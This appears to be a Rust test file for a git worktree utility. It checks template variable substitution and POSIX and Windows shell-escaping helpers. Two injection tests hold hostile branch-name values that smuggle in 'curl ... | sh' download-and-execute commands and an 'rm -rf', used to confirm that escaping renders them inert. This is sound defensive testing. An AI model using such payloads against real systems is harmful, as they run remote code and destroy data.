use std::path::PathBuf;

use wisetree::utils::path::{
    get_worktree_path, repository_base_name, resolve_template, resolve_template_shell,
    shell_escape_cmd, shell_escape_posix, TemplateVariables,
};

fn vars(base: &str, worktree: &str, branch: &str, source: &str) -> TemplateVariables {
    TemplateVariables {
        base_path: base.into(),
        worktree_path: worktree.into(),
        branch_name: branch.into(),
        source_branch: source.into(),
    }
}

#[test]
fn substitutes_every_variable() {
    let v = vars("repo", "/parent/feat-x", "feat", "main");
    let template = "$BASE_PATH-$BRANCH_NAME-$SOURCE_BRANCH-$WORKTREE_PATH";
    assert_eq!(
        resolve_template(template, &v),
        "repo-feat-main-/parent/feat-x"
    );
}

#[test]
fn empty_template_yields_empty_string() {
    let v = TemplateVariables::default();
    assert_eq!(resolve_template("", &v), "");
}

#[test]
fn unknown_variable_left_in_place() {
    let v = TemplateVariables::default();
    assert_eq!(resolve_template("$UNKNOWN", &v), "$UNKNOWN");
}

#[test]
fn repository_base_name_is_last_component() {
    let p = PathBuf::from("/Users/me/code/myrepo");
    assert_eq!(repository_base_name(&p), "myrepo");
}

#[test]
fn worktree_path_uses_default_template() {
    let git_root = PathBuf::from("/repos/myrepo");
    let path = get_worktree_path(
        &git_root,
        "feat-x",
        "$BASE_PATH.worktree",
        Some("feat-x"),
        Some("main"),
    );
    assert_eq!(path, PathBuf::from("/repos/myrepo.worktree/feat-x"));
}

#[test]
fn shell_escape_posix_wraps_in_single_quotes() {
    assert_eq!(shell_escape_posix("main"), "'main'");
    assert_eq!(shell_escape_posix(""), "''");
}

#[test]
fn shell_escape_posix_neutralises_metacharacters() {
    // Dollar-paren / pipe / semicolon / backtick — the canonical injection
    // vectors — all stay inside the single-quoted span and are inert.
    let escaped = shell_escape_posix("main$(curl http://x|sh);rm -rf `pwd`");
    assert_eq!(escaped, "'main$(curl http://x|sh);rm -rf `pwd`'");
}

#[test]
fn shell_escape_posix_handles_embedded_single_quote() {
    assert_eq!(shell_escape_posix("a'b"), "'a'\\''b'");
}

#[test]
fn shell_escape_cmd_wraps_in_double_quotes() {
    assert_eq!(shell_escape_cmd("main"), "\"main\"");
}

#[test]
fn shell_escape_cmd_caret_escapes_metacharacters() {
    let escaped = shell_escape_cmd("a&b|c<d>e^f%g!h(i)j");
    assert_eq!(escaped, "\"a^&b^|c^<d^>e^^f^%g^!h^(i^)j\"");
}

#[test]
fn resolve_template_shell_blocks_command_substitution_injection() {
    let v = vars("repo", "/p/w", "main$(curl evil|sh)", "main");
    let resolved = resolve_template_shell("git fetch origin $BRANCH_NAME", &v);
    // The whole branch value lives inside one single-quoted span, so `sh -c`
    // sees it as a literal argument to `git fetch`, never as a command
    // substitution.
    assert_eq!(resolved, "git fetch origin 'main$(curl evil|sh)'");
}

#[test]
fn worktree_path_with_branch_template() {
    let git_root = PathBuf::from("/repos/myrepo");
    let path = get_worktree_path(
        &git_root,
        "feature-foo",
        "$BASE_PATH-$BRANCH_NAME",
        Some("feature/foo"),
        Some("main"),
    );
    assert_eq!(path, PathBuf::from("/repos/myrepo-feature/foo/feature-foo"));
}
